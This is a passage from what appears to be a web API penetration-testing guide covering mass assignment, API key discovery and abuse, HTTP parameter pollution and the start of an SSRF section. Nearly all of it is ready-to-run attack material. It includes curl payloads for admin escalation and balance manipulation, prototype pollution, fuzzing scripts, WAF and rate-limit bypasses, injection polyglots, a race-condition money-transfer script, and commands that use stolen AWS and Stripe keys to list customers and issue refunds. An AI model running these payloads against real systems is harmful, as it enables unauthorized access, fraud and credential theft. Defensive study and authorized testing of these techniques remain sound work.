  -d '{"username":"test3","email":"test3@test.com","verified":true,"premium":true,"credits":1000,"balance":9999}'
```

**Common Mass Assignment Targets**

```json
// User privilege escalation
{
  "username": "attacker",
  "role": "admin",
  "is_admin": true,
  "admin": 1,
  "privilege": 99,
  "permissions": ["read", "write", "delete", "admin"],
  "user_type": "admin",
  "account_type": "premium"
}

// Account attributes
{
  "verified": true,
  "is_verified": true,
  "email_verified": true,
  "active": true,
  "enabled": true,
  "suspended": false,
  "banned": false
}

// Financial manipulation
{
  "balance": 999999,
  "credits": 999999,
  "price": 0,
  "discount": 100,
  "cost": 0.01,
  "subscription_tier": "premium"
}

// Internal identifiers
{
  "id": 1,
  "user_id": 1,
  "account_id": 1,
  "organization_id": 1,
  "company_id": 1
}
```

### Exploitation Techniques

**Profile Update Mass Assignment**

```bash
# Normal profile update
curl -X PUT https://target.com/api/users/123 \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio":"Test bio","location":"Test City"}'

# Mass assignment attempt
curl -X PUT https://target.com/api/users/123 \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio":"Test bio","location":"Test City","role":"admin","credits":9999}'
```

**Registration Mass Assignment**

```bash
# Registration with privilege escalation
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@test.com",
    "password": "password123",
    "role": "admin",
    "verified": true,
    "subscription": "premium"
  }'
```

**Nested Object Mass Assignment** [Inference] Some frameworks allow nested parameter assignment.

```bash
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "email": "test@test.com",
    "profile": {
      "bio": "Test",
      "role": "admin"
    },
    "settings": {
      "verified": true,
      "premium": true
    }
  }'
```

**Array-Based Mass Assignment**

```bash
# Test array parameter pollution
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "permissions": ["read", "write", "admin", "superuser"]
  }'
```

### Framework-Specific Testing

**Ruby on Rails** Rails strong parameters may be misconfigured.

```bash
# Test rails-style nested attributes
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "username": "test",
      "role_attributes": {
        "name": "admin"
      }
    }
  }'
```

**Node.js/Express** Express applications using body-parser without filtering.

```bash
# Test prototype pollution via mass assignment
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "__proto__": {
      "admin": true
    }
  }'

# Test constructor pollution
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "constructor": {
      "prototype": {
        "admin": true
      }
    }
  }'
```

**Django REST Framework** Django may allow mass assignment through ModelSerializer.

```bash
curl -X POST https://target.com/api/users/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Token YOUR_TOKEN" \
  -d '{
    "username": "test",
    "is_staff": true,
    "is_superuser": true
  }'
```

### Automated Testing

```python
#!/usr/bin/env python3
# Mass assignment fuzzer

import requests
import itertools

# Common privilege fields to test
privilege_fields = [
    "admin", "is_admin", "isAdmin", "role", "user_role",
    "privilege", "permission", "permissions", "access_level",
    "verified", "is_verified", "active", "enabled"
]

privilege_values = [True, 1, "admin", "administrator", "superuser", 99]

base_payload = {
    "username": "testuser",
    "email": "test@example.com"
}

url = "https://target.com/api/users"
headers = {"Content-Type": "application/json"}

for field, value in itertools.product(privilege_fields, privilege_values):
    payload = base_payload.copy()
    payload[field] = value
    
    response = requests.post(url, json=payload, headers=headers)
    
    if response.status_code in [200, 201]:
        print(f"[+] Potential mass assignment: {field}={value}")
        print(f"    Response: {response.json()}")
```

## API Key Exposure

API keys provide authentication to third-party services and internal APIs. Exposure occurs through client-side code, version control, logs, or insecure storage.

### Discovery Locations

**Client-Side JavaScript**

```bash
# Download and search JavaScript files
wget -r -l 1 -A.js https://target.com

# Search for API keys in downloaded files
grep -r -E "api[_-]?key|apikey|api[_-]?secret|access[_-]?token" .
grep -r -E "['\"]([A-Za-z0-9_-]{20,})['\"]" . | grep -i api

# Common API key patterns
grep -r -E "sk_live_[A-Za-z0-9]{24}" .  # Stripe
grep -r -E "AIza[0-9A-Za-z_-]{35}" .    # Google
grep -r -E "AKIA[0-9A-Z]{16}" .         # AWS
grep -r -E "ya29\.[0-9A-Za-z_-]+" .     # Google OAuth
```

**Using truffleHog for secret detection**

```bash
# Scan git repository
trufflehog git https://github.com/target/repo --json | jq .

# Scan filesystem
trufflehog filesystem /path/to/files --json

# Scan with custom regex patterns
trufflehog --regex --entropy=False git https://github.com/target/repo
```

**GitHub/GitLab Reconnaissance**

```bash
# Using github-search tool
github-search -t YOUR_GITHUB_TOKEN -q "target.com API_KEY"
github-search -t YOUR_GITHUB_TOKEN -q "target.com password"

# Manual GitHub search queries
# In browser: site:github.com "target.com" "api_key"
# In browser: site:github.com "target.com" "access_token"

# GitLab API search
curl "https://gitlab.com/api/v4/projects?search=target.com"
```

**Mobile Application Analysis**

```bash
# Decompile APK
apktool d target.apk -o output/

# Search for API keys
grep -r "api" output/
grep -r -E "[A-Za-z0-9_-]{32,}" output/res/values/strings.xml

# For iOS
# Unzip IPA file
unzip target.ipa

# Search in binary
strings Payload/*.app/* | grep -i api
strings Payload/*.app/* | grep -E "[A-Za-z0-9_-]{32,}"
```

**Environment Files and Backups**

```bash
# Common exposed files
curl https://target.com/.env
curl https://target.com/.env.backup
curl https://target.com/.env.old
curl https://target.com/.env.production
curl https://target.com/config.json
curl https://target.com/config.yml
curl https://target.com/settings.json

# Backup file discovery
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt
```

**Browser Storage**

```javascript
// Check localStorage in browser console
for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    console.log(key + ": " + localStorage.getItem(key));
}

// Check sessionStorage
for (let i = 0; i < sessionStorage.length; i++) {
    let key = sessionStorage.key(i);
    console.log(key + ": " + sessionStorage.getItem(key));
}

// Check cookies
console.log(document.cookie);
```

### API Key Validation

Once potential API keys are discovered, validate them:

```bash
# AWS keys
aws sts get-caller-identity --profile discovered

# Google API key
curl "https://www.googleapis.com/geolocation/v1/geolocate?key=DISCOVERED_KEY"

# Stripe key
curl https://api.stripe.com/v1/charges \
  -u "DISCOVERED_KEY:"

# SendGrid
curl https://api.sendgrid.com/v3/api_keys \
  -H "Authorization: Bearer DISCOVERED_KEY"

# Slack
curl -X POST https://slack.com/api/auth.test \
  -H "Authorization: Bearer DISCOVERED_KEY"

# GitHub
curl -H "Authorization: token DISCOVERED_TOKEN" \
  https://api.github.com/user

# Mailgun
curl -s --user 'api:DISCOVERED_KEY' \
  https://api.mailgun.net/v3/domains
```

**Automated Key Validation**

```python
#!/usr/bin/env python3
import requests

def validate_aws_key(access_key, secret_key):
    # Requires boto3: pip install boto3
    import boto3
    try:
        client = boto3.client(
            'sts',
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key
        )
        response = client.get_caller_identity()
        return True, response
    except:
        return False, None

def validate_google_key(api_key):
    url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={api_key}"
    response = requests.post(url, json={})
    return response.status_code != 403

def validate_stripe_key(api_key):
    response = requests.get(
        "https://api.stripe.com/v1/charges",
        auth=(api_key, '')
    )
    return response.status_code != 401

# Add more validators as needed
```

### Exploitation After Key Discovery

**AWS Key Exploitation**

```bash
# Configure AWS CLI with discovered keys
aws configure --profile compromised
# Enter access key and secret key

# Enumerate permissions
aws iam get-user --profile compromised
aws s3 ls --profile compromised
aws ec2 describe-instances --profile compromised
aws lambda list-functions --profile compromised

# Using enumerate-iam tool
pip install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key ...
```

**Google Cloud Key Exploitation**

```bash
# Test API permissions
curl "https://www.googleapis.com/storage/v1/b?key=DISCOVERED_KEY"
curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=DISCOVERED_KEY"

# Cloud Storage enumeration
gsutil ls -p PROJECT_ID gs://
```

**Stripe Key Exploitation**

```bash
# List customers
curl https://api.stripe.com/v1/customers \
  -u "sk_live_KEY:"

# Retrieve balance
curl https://api.stripe.com/v1/balance \
  -u "sk_live_KEY:"

# Create refund (be cautious with this in real scenarios)
curl https://api.stripe.com/v1/refunds \
  -u "sk_live_KEY:" \
  -d "charge=ch_XXX"
```

## API Parameter Pollution

Parameter pollution exploits how APIs parse multiple parameters with the same name, leading to unexpected behavior when backend and middleware handle duplicates differently.

### HTTP Parameter Pollution (HPP)

**Query String Pollution**

```bash
# Single parameter
curl "https://target.com/api/users?id=123"

# Duplicate parameters - different parsing behaviors
curl "https://target.com/api/users?id=123&id=456"
# PHP: Uses last value (456)
# ASP.NET: Concatenates with comma (123,456)
# Java: Uses first value (123)
# Node.js (Express): Creates array [123, 456]
```

**Testing Different Parsing Behaviors**

```bash
# Test authorization bypass
curl "https://target.com/api/users/123?user_id=123&user_id=456" \
  -H "Authorization: Bearer USER_123_TOKEN"
# May access user 456's data if backend uses different parameter

# Test filter bypass
curl "https://target.com/api/search?category=public&category=private"
# May return both public and private results

# Array injection
curl "https://target.com/api/users?id[]=1&id[]=2&id[]=3"
```

**POST Body Parameter Pollution**

```bash
# JSON parameter pollution
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"user_id":"123","user_id":"456","role":"user","role":"admin"}'

# Form-encoded pollution
curl -X POST https://target.com/api/update \
  -d "user_id=123&user_id=456&role=user&role=admin"

# Mixed content-type attacks
curl -X POST "https://target.com/api/update?user_id=456" \
  -H "Content-Type: application/json" \
  -d '{"user_id":"123","role":"admin"}'
```

### JSON Parameter Pollution

**Duplicate Keys in JSON** [Inference] JSON specification doesn't prohibit duplicate keys, but parsers handle them differently.

```bash
# Most parsers use last occurrence
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"role":"user","username":"test","role":"admin"}'

# Test with various structures
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "role": "user",
      "username": "test",
      "role": "admin"
    }
  }'
```

**Array vs Object Confusion**

```bash
# Send object where array expected
curl -X POST https://target.com/api/permissions \
  -H "Content-Type: application/json" \
  -d '{"permissions": {"0": "read", "1": "admin"}}'

# Send array where object expected
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"settings": ["theme", "dark"]}'
```

### GraphQL Parameter Pollution

**Field Duplication**

```bash
# GraphQL query with duplicate fields
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { user(id: 123) { email role role } }"
  }'

# Alias-based pollution
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { 
      user1: user(id: 123) { email } 
      user2: user(id: 456) { email }
    }"
  }'
```

**Batch Query Pollution**

```bash
# Send multiple operations
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "query { user(id: 123) { email } }"},
    {"query": "query { user(id: 456) { email } }"},
    {"query": "mutation { deleteUser(id: 789) }"}
  ]'
```

### XML Parameter Pollution

**Duplicate XML Elements**

```bash
# SOAP request with duplicate elements
curl -X POST https://target.com/api/soap \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>123</userId>
      <userId>456</userId>
      <role>user</role>
      <role>admin</role>
    </GetUser>
  </soap:Body>
</soap:Envelope>'
```

### Advanced Parameter Pollution Attacks

**WAF/Security Filter Bypass** [Inference] Security filters may check first parameter while backend uses last.

```bash
# Filter checks first "role=user", backend uses last "role=admin"
curl "https://target.com/api/update?role=user&role=admin&user_id=123"

# Split malicious payload across parameters
curl "https://target.com/api/search?query=normal&query=' OR '1'='1"
```

**Logic Flaw Exploitation**

```bash
# Price manipulation
curl -X POST https://target.com/api/checkout \
  -d "item_id=123&price=100.00&price=0.01"

# Quantity manipulation  
curl -X POST https://target.com/api/cart/add \
  -d "product_id=456&quantity=1&quantity=-10"

# Discount stacking
curl -X POST https://target.com/api/apply-discount \
  -d "code=SAVE10&code=SAVE20&code=SAVE50"
```

**Authorization Context Switching**

```bash
# Backend may authorize for user_id=123 but execute for user_id=456
curl -X DELETE "https://target.com/api/posts/789?user_id=123&user_id=456" \
  -H "Authorization: Bearer USER_123_TOKEN"

# Organization context switching
curl "https://target.com/api/documents?org_id=100&org_id=200" \
  -H "Authorization: Bearer ORG_100_TOKEN"
```

### Automated Parameter Pollution Testing

```python
#!/usr/bin/env python3
import requests
import itertools

def test_parameter_pollution(url, params, values):
    """
    Test HPP by sending multiple values for same parameter
    """
    results = []
    
    for param in params:
        for val1, val2 in itertools.combinations(values, 2):
            # Test different pollution patterns
            patterns = [
                f"{param}={val1}&{param}={val2}",  # Standard duplication
                f"{param}[]={val1}&{param}[]={val2}",  # Array syntax
                f"{param}={val1},{val2}",  # Comma-separated
            ]
            
            for pattern in patterns:
                test_url = f"{url}?{pattern}"
                response = requests.get(test_url)
                
                if response.status_code == 200:
                    results.append({
                        'url': test_url,
                        'status': response.status_code,
                        'response': response.text[:200]
                    })
    
    return results

# Example usage
url = "https://target.com/api/users"
params = ["id", "user_id", "role", "access_level"]
values = ["1", "2", "admin", "user"]

results = test_parameter_pollution(url, params, values)
for result in results:
    print(f"[+] {result['url']}")
    print(f"    Status: {result['status']}")
```

**Burp Suite Approach**

```bash
# Using Burp Intruder for parameter pollution
# 1. Send request to Intruder
# 2. Add parameter multiple times:
#    ?id=Â§1Â§&id=Â§2Â§&role=Â§userÂ§&role=Â§adminÂ§
# 3. Use cluster bomb attack with different payloads
# 4. Analyze responses for unexpected behavior
```

### Framework-Specific Considerations

**PHP Parameter Pollution** PHP's `$_GET` and `$_POST` arrays use the last value when parameters are duplicated.

```bash
# PHP will use "456" for $id
curl "https://target.com/api.php?id=123&id=456"

# Array syntax in PHP
curl "https://target.com/api.php?id[]=123&id[]=456"
# Creates: $_GET['id'] = array(123, 456)

# Associative array injection
curl "https://target.com/api.php?user[id]=123&user[role]=admin"
# Creates: $_GET['user'] = array('id' => 123, 'role' => 'admin')
```

**ASP.NET Parameter Pollution** ASP.NET concatenates multiple parameter values with commas.

```bash
# Results in: Request.QueryString["id"] = "123,456"
curl "https://target.com/api.aspx?id=123&id=456"

# Exploit concatenation behavior
curl "https://target.com/api.aspx?filter=public&filter=private"
# May bypass filters if code splits on comma

# Test with SQL injection
curl "https://target.com/api.aspx?id=1&id=' OR '1'='1"
# Results in: id = "1,' OR '1'='1"
```

**Node.js/Express Parameter Pollution** Express creates arrays when duplicate parameters exist (depending on configuration).

```bash
# Default behavior: creates array
curl "https://target.com/api/users?id=123&id=456"
# req.query.id = ['123', '456']

# May cause type confusion
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"role": ["user", "admin"]}'
# If code expects string, may use array

# Prototype pollution via query params
curl "https://target.com/api/users?__proto__[admin]=true"
curl "https://target.com/api/users?constructor[prototype][admin]=true"
```

**Java/Spring Parameter Pollution** Spring uses the first value by default but can be configured differently.

```bash
# Spring MVC uses first value
curl "https://target.com/api/users?id=123&id=456"
# @RequestParam String id = "123"

# List binding
curl "https://target.com/api/users?ids=123&ids=456&ids=789"
# @RequestParam List<String> ids = [123, 456, 789]

# Object binding pollution
curl -X POST https://target.com/api/users \
  -d "username=test&role=user&role=admin"
```

**Python/Flask Parameter Pollution** Flask's request.args uses the first value; request.args.getlist() returns all values.

```bash
# request.args.get('id') returns '123'
curl "https://target.com/api/users?id=123&id=456"

# Test if getlist() is used
curl "https://target.com/api/users?id=123&id=456&id=789"
# If getlist() is used: ['123', '456', '789']

# ImmutableMultiDict behavior
curl "https://target.com/api/search?category=public&category=private&category=admin"
```

### Content-Type Confusion Attacks

**Mixed Content-Type Pollution** Exploit different parsing behaviors when content-type doesn't match body format.

```bash
# Send JSON with form content-type
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"role":"admin"}'

# Send form data with JSON content-type
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d "role=admin&user_id=123"

# XML in JSON endpoint
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '<?xml version="1.0"?><user><role>admin</role></user>'
```

**Charset-Based Pollution** [Inference] Different charset interpretations may cause parsing inconsistencies.

```bash
# UTF-7 encoding bypass
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json; charset=UTF-7" \
  -d '+AHs-+ACI-role+ACI-:+ACI-admin+ACI-+AH0-'

# UTF-16 encoding
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json; charset=UTF-16" \
  --data-binary @utf16_payload.txt

# Mixed encoding attack
curl -X POST "https://target.com/api/update?role=%61%64%6d%69%6e" \
  -d "role=user"
```

### Header Parameter Pollution

**Custom Header Duplication**

```bash
# Duplicate custom headers
curl https://target.com/api/users \
  -H "X-User-ID: 123" \
  -H "X-User-ID: 456" \
  -H "X-Role: user" \
  -H "X-Role: admin"

# Authorization header pollution
curl https://target.com/api/data \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Authorization: Bearer ADMIN_TOKEN"

# API key header pollution
curl https://target.com/api/resources \
  -H "X-API-Key: limited_key" \
  -H "X-API-Key: admin_key"
```

**Host Header Pollution**

```bash
# Multiple Host headers
curl https://target.com/api/users \
  -H "Host: target.com" \
  -H "Host: admin.target.com"

# Host header with port confusion
curl https://target.com/api/users \
  -H "Host: target.com:80" \
  -H "Host: target.com:443"
```

**X-Forwarded Headers Pollution**

```bash
# Multiple X-Forwarded-For headers
curl https://target.com/api/users \
  -H "X-Forwarded-For: 1.1.1.1" \
  -H "X-Forwarded-For: 127.0.0.1"

# Conflicting forwarding headers
curl https://target.com/api/admin \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 192.168.1.1"
```

### Cookie Parameter Pollution

```bash
# Multiple cookies with same name
curl https://target.com/api/users \
  -H "Cookie: session=user_session; session=admin_session"

# Cookie with multiple values
curl https://target.com/api/users \
  -H "Cookie: role=user; role=admin; user_id=123"

# Domain-based cookie pollution
curl https://target.com/api/users \
  -b "cookie1=value1" \
  -b "cookie1=value2" \
  --cookie-jar cookies.txt
```

### GraphQL-Specific Parameter Pollution

**Variable Pollution**

```bash
# Duplicate variables in GraphQL
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($id: ID!, $id: ID!) { user(id: $id) { email } }",
    "variables": {"id": "123", "id": "456"}
  }'

# Variable type confusion
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($role: String!) { users(role: $role) { email } }",
    "variables": {"role": "user", "role": ["admin", "superuser"]}
  }'
```

**Directive Pollution**

```bash
# Multiple directives on same field
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { user(id: 123) { email @include(if: false) @include(if: true) } }"
  }'

# Conflicting skip/include directives
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { user(id: 123) { ssn @skip(if: true) @include(if: true) } }"
  }'
```

**Fragment Pollution**

```bash
# Overlapping fragment fields
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { 
      user(id: 123) { 
        ...UserFields 
        ...AdminFields 
      } 
    }
    fragment UserFields on User { email role }
    fragment AdminFields on User { role permissions }"
  }'
```

### REST API Pollution Patterns

**Nested Resource Pollution**

```bash
# Conflicting resource identifiers in path and body
curl -X PUT https://target.com/api/users/123/posts/456 \
  -H "Content-Type: application/json" \
  -d '{"user_id": 789, "post_id": 999, "content": "test"}'

# Query parameter vs path parameter
curl -X GET "https://target.com/api/users/123?user_id=456"

# Header vs path parameter
curl -X GET https://target.com/api/users/123 \
  -H "X-User-ID: 456"
```

**Filter Pollution**

```bash
# Multiple filter parameters
curl "https://target.com/api/users?filter=active&filter=admin&filter=*"

# Filter array pollution
curl "https://target.com/api/users?filter[]=status:active&filter[]=role:admin"

# Conflicting sort orders
curl "https://target.com/api/users?sort=asc&sort=desc"
curl "https://target.com/api/users?order=name&order=id"
```

**Pagination Pollution**

```bash
# Conflicting pagination parameters
curl "https://target.com/api/users?page=1&page=999&limit=10&limit=9999"

# Offset vs cursor pagination
curl "https://target.com/api/users?offset=0&cursor=abc123"

# Negative pagination values
curl "https://target.com/api/users?page=-1&limit=-100"
```

### Advanced Exploitation Techniques

**Race Condition Combined with Pollution**

```python
#!/usr/bin/env python3
import requests
import threading

def polluted_request(session_id):
    # Send request with parameter pollution during race condition
    requests.post(
        'https://target.com/api/transfer',
        data='from_account=123&to_account=456&from_account=789&amount=1000',
        cookies={'session': session_id}
    )

threads = []
for _ in range(20):
    t = threading.Thread(target=polluted_request, args=('YOUR_SESSION',))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Blind Parameter Pollution Detection** [Inference] When you cannot see direct response differences, use timing or side-channel indicators.

```bash
# Time-based detection
time curl "https://target.com/api/search?query=test&query=test' AND SLEEP(5)--"

# Error-based detection via logs
curl "https://target.com/api/users?id=123&id=999999999999" -v
# Check if error messages differ

# Behavioral detection
curl "https://target.com/api/users?limit=10&limit=1" 
# Count returned results to detect which parameter is used
```

**Polyglot Parameter Pollution** Craft payloads that work across multiple contexts.

```bash
# Polyglot for both SQL and NoSQL injection
curl "https://target.com/api/users?id=1&id=' OR '1'='1&id[\$ne]=null"

# Polyglot for XSS and template injection
curl "https://target.com/api/search?q=test&q=<script>alert(1)</script>&q={{7*7}}"

# Polyglot for command and LDAP injection
curl "https://target.com/api/lookup?name=test&name=*)(uid=*))(|(uid=*&name=;id;"
```

### Automated Testing Tools and Scripts

**Custom Pollution Fuzzer**

```python
#!/usr/bin/env python3
import requests
from itertools import product

class ParameterPollutionTester:
    def __init__(self, base_url, params):
        self.base_url = base_url
        self.params = params
        self.results = []
    
    def test_query_pollution(self):
        """Test query string parameter pollution"""
        for param, values in self.params.items():
            # Test duplicate parameters
            query = '&'.join([f"{param}={v}" for v in values])
            url = f"{self.base_url}?{query}"
            
            try:
                response = requests.get(url, timeout=5)
                self.results.append({
                    'type': 'query_pollution',
                    'url': url,
                    'status': response.status_code,
                    'length': len(response.text)
                })
            except Exception as e:
                print(f"Error testing {url}: {e}")
    
    def test_body_pollution(self):
        """Test POST body parameter pollution"""
        for param, values in self.params.items():
            # Form-encoded pollution
            data = '&'.join([f"{param}={v}" for v in values])
            
            try:
                response = requests.post(
                    self.base_url,
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=5
                )
                self.results.append({
                    'type': 'body_pollution',
                    'data': data,
                    'status': response.status_code
                })
            except Exception as e:
                print(f"Error with body pollution: {e}")
    
    def test_json_pollution(self):
        """Test JSON duplicate keys"""
        for param, values in self.params.items():
            # Create JSON with duplicate keys
            json_parts = [f'"{param}":"{v}"' for v in values]
            json_payload = '{' + ','.join(json_parts) + '}'
            
            try:
                response = requests.post(
                    self.base_url,
                    data=json_payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                self.results.append({
                    'type': 'json_pollution',
                    'payload': json_payload,
                    'status': response.status_code
                })
            except Exception as e:
                print(f"Error with JSON pollution: {e}")
    
    def test_header_pollution(self):
        """Test duplicate headers"""
        test_headers = {
            'X-User-ID': ['123', '456'],
            'X-Role': ['user', 'admin'],
            'X-API-Key': ['key1', 'key2']
        }
        
        for header, values in test_headers.items():
            # Note: requests library doesn't support duplicate headers directly
            # This is a conceptual example
            headers_dict = {header: ', '.join(values)}
            
            try:
                response = requests.get(
                    self.base_url,
                    headers=headers_dict,
                    timeout=5
                )
                self.results.append({
                    'type': 'header_pollution',
                    'headers': headers_dict,
                    'status': response.status_code
                })
            except Exception as e:
                print(f"Error with header pollution: {e}")
    
    def run_all_tests(self):
        """Execute all pollution tests"""
        print("[*] Testing query pollution...")
        self.test_query_pollution()
        
        print("[*] Testing body pollution...")
        self.test_body_pollution()
        
        print("[*] Testing JSON pollution...")
        self.test_json_pollution()
        
        print("[*] Testing header pollution...")
        self.test_header_pollution()
        
        return self.results

# Example usage
if __name__ == "__main__":
    tester = ParameterPollutionTester(
        base_url="https://target.com/api/users",
        params={
            'id': ['123', '456', '789'],
            'role': ['user', 'admin'],
            'status': ['active', 'suspended']
        }
    )
    
    results = tester.run_all_tests()
    
    # Analyze results
    interesting = [r for r in results if r['status'] == 200]
    print(f"\n[+] Found {len(interesting)} potentially interesting responses")
    for result in interesting[:10]:
        print(f"    {result}")
```

**Burp Suite Extension Approach**

```python
# Burp Extension skeleton for parameter pollution testing
# Save as parameter_pollution.py and load in Burp

from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.net import URL

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Parameter Pollution Scanner")
        callbacks.registerScannerCheck(self)
    
    def doPassiveScan(self, baseRequestResponse):
        return []
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        issues = []
        
        # Get base request
        request = baseRequestResponse.getRequest()
        analyzedRequest = self._helpers.analyzeRequest(request)
        
        # Test parameter pollution
        pollution_payloads = [
            "123&param=456",
            "value1&param=value2",
            "admin"
        ]
        
        for payload in pollution_payloads:
            checkRequest = insertionPoint.buildRequest(payload)
            checkRequestResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                checkRequest
            )
            
            # Analyze response
            response = checkRequestResponse.getResponse()
            analyzedResponse = self._helpers.analyzeResponse(response)
            
            # Check for interesting behavior
            if self._is_vulnerable(analyzedResponse):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [checkRequestResponse],
                    "Parameter Pollution Vulnerability",
                    "The application appears vulnerable to parameter pollution",
                    "High"
                ))
        
        return issues
    
    def _is_vulnerable(self, analyzedResponse):
        # Implement detection logic
        # [Inference] Check for status code changes, content differences, etc.
        return False  # Placeholder

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return -1 if existingIssue.getIssueName() == newIssue.getIssueName() else 0
```

### Defense Detection and Bypass

**WAF Bypass via Pollution**

```bash
# WAF checks first parameter, backend uses last
curl "https://target.com/api/search?q=safe&q=' OR 1=1--"

# Split attack across parameters
curl "https://target.com/api/exec?cmd=ls&cmd=-la&cmd=/etc"

# Case variation pollution
curl "https://target.com/api/user?ID=123&id=456&Id=789"

# Encoding pollution
curl "https://target.com/api/user?id=123&%69%64=456"
```

**Rate Limit Bypass via Pollution**

```bash
# Different parameter names for same value
curl "https://target.com/api/data?user_id=123"
curl "https://target.com/api/data?userId=123"
curl "https://target.com/api/data?user=123"
curl "https://target.com/api/data?id=123"

# Parameter pollution to bypass rate limiting
for i in {1..1000}; do
  curl "https://target.com/api/data?id=123&cache_bust=$RANDOM"
done
```

### Important Considerations

**Disclaimer on Testing** [Unverified] Parameter pollution behavior varies significantly across frameworks, versions, and configurations. Always test thoroughly in controlled environments before drawing conclusions about specific behaviors.

**Related Attack Vectors** Parameter pollution often combines effectively with:

- SQL Injection (pollution in WHERE clauses)
- NoSQL Injection (pollution in query objects)
- Authorization bypass (conflicting user identifiers)
- Business logic flaws (price/quantity manipulation)
- SSRF (pollution in URL construction)
- Template injection (pollution in template variables)

---

# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery forces a server to make HTTP requests to arbitrary destinations chosen by the attacker. SSRF bypasses network segmentation, accesses internal resources, interacts with cloud metadata services, and can lead to remote code execution, credential theft, and complete infrastructure compromise.

## SSRF Mechanics

### Vulnerability Identification

**Common vulnerable parameters:**

```http
GET /fetch?url=http://example.com HTTP/1.1
GET /proxy?page=https://target.com HTTP/1.1
GET /download?file=http://cdn.example.com/image.jpg HTTP/1.1
POST /api/webhook HTTP/1.1
Content-Type: application/json

{"callback_url": "https://attacker.com/hook"}
```

**URL parameter locations:**

- Query strings: `?url=`, `?page=`, `?feed=`, `?host=`, `?uri=`
- JSON bodies: `{"url": "...", "webhook": "...", "callback": "..."}`
- XML bodies: `<url>...</url>`, `<link>...</link>`
- HTTP headers: `Referer:`, `X-Forwarded-For:`, `X-Original-URL:`
- File paths: `/api/import?path=file:///etc/passwd`
- Partial URLs: `host=internal-server`, `domain=localhost`

**Detection payloads:**

```bash
# Basic HTTP callback
http://burpcollaborator.net
http://YOUR_IP:8000

# Localhost variations
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0

# Internal IP ranges
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Cloud metadata endpoints
http://169.254.169.254
http://metadata.google.internal
```

**Burp Collaborator workflow:**

```bash
# Generate Collaborator payload
# Insert in URL parameter: http://UNIQUE_ID.burpcollaborator.net
# Monitor for DNS/HTTP callbacks
# Callback confirms SSRF vulnerability
```

**Out-of-band detection script:**

```python
import requests
import sys

def test_ssrf(target_url, param_name):
    """
    Test for SSRF using external callback server
    """
    # Replace with your server or Burp Collaborator
    callback_server = "http://YOUR_SERVER.com/ssrf_test"
    
    payloads = [
        callback_server,
        f"http://127.0.0.1@{callback_server}",
        f"http://{callback_server}#@localhost",
    ]
    
    for payload in payloads:
        params = {param_name: payload}
        try:
            response = requests.get(target_url, params=params, timeout=10)
            print(f"Payload: {payload}")
            print(f"Status: {response.status_code}")
            print(f"Response length: {len(response.text)}\n")
        except Exception as e:
            print(f"Error with {payload}: {e}\n")

# Usage
test_ssrf("http://target.com/fetch", "url")
```

### Protocol Exploitation

**HTTP/HTTPS:**

